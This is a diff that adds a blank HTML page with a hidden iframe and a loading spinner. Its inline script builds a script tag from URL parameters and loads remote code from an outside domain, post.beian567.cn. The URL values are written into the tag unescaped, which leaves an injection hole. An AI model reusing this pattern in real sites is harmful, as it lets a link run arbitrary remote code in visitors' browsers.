@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title> </title>
+    <link rel="icon" href="data:;base64,=">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scalable=no"/>
+</head>
+<body>
+<iframe id="s-iframe" style="width: 100%;height: 100%;display: none" frameborder="no" border="0" marginwidth="0"
+        marginheight="0" scrolling="auto"></iframe>
+<div id="s-loading" class="loadingio-spinner-ripple-tunr5enxcd float-center">
+    <div class="ldio-vk7cihzrpol">
+        <div></div>
+        <div></div>
+    </div>
+</div>
+<style type="text/css">
+    html,body{height: 100%;margin: 0 }.float-center{float:left;position:fixed;margin:0 auto;z-index:999;left:0;right:0;top:10%}@keyframes ldio-vk7cihzrpol{0%{top:48px;left:48px;width:0;height:0;opacity:1}100%{top:9px;left:9px;width:78px;height:78px;opacity:0}}.ldio-vk7cihzrpol div{position:absolute;border-width:2px;border-style:solid;opacity:1;border-radius:50%;animation:ldio-vk7cihzrpol 1s cubic-bezier(0,.2,.8,1) infinite}.ldio-vk7cihzrpol div:nth-child(1){border-color:#e90c59}.ldio-vk7cihzrpol div:nth-child(2){border-color:#46dff0;animation-delay:-.5s}.loadingio-spinner-ripple-tunr5enxcd{width:100px;height:100px;display:inline-block;overflow:hidden;background:0 0}.ldio-vk7cihzrpol{width:100%;height:100%;position:relative;transform:translateZ(0) scale(1);backface-visibility:hidden;transform-origin:0 0}.ldio-vk7cihzrpol div{box-sizing:content-box}
+</style>
+<div id="s-content">
+    <script>
+        let url = new URL(window.location.href);
+        let short = url.searchParams.get("s");
+        let dt = url.searchParams.get("dt");
+        let sas = url.searchParams.get("sas");
+
+        if (!short){
+            const paths = url.pathname.split("/");
+            let pathShort = paths.pop();
+            dt = paths.pop();
+            short = pathShort
+        }
+
+        document.write(`<script ${sas == 1 ? "async" : ""} src="https://post.beian567.cn/js/${short}?dt=${dt}"><\/script>`);
+    </script>
+</div>
+<div id="statement"></div>
+</body>
+</html>
